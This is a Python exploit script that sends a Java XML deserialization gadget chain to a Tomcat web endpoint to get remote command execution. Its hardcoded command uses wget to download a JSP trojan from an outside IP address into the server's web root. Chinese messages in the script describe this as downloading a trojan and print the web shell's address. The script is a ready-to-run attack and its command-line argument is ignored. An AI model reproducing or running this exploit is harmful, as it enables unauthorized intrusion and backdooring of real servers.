import requests
import sys
from lxml import html

class Exploit:
    def exp(self,url,cmd):
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Referer':url,'Connection':'close','Cookie':'JSESSIONID=E25862AE388D006049EA9D3CEF12F246','Upgrade-Insecure-Requests':'1','Cache-Control':'max-age=0','Content-Type':'application/xml'}
        xml="""
        <map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>wget</string>
                        <string>-P</string>
                        <string>/usr/local/tomcat/webapps/ROOT/</string>
                        <string>96.63.216.104/1.jsp</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""
        r=requests.post(url,headers=headers,data=xml)
        page=r.text


if __name__=='__main__':
    if len(sys.argv)!=3:
        print("[+]ussage: http://ip:端口/edit cmd命令")
        print("[+]hint:wget%20-P%20/usr/local/tomcat/webapps/ROOT/%2096.63.216.104/1.jsp 下载木马")
        sys.exit()
    url=sys.argv[1]
    cmd=sys.argv[2]
    attack=Exploit()
    attack.exp(url,cmd)
    print("已经成功在根目录下载木马")
    print("木马地址为：http://ip/1.jsp")

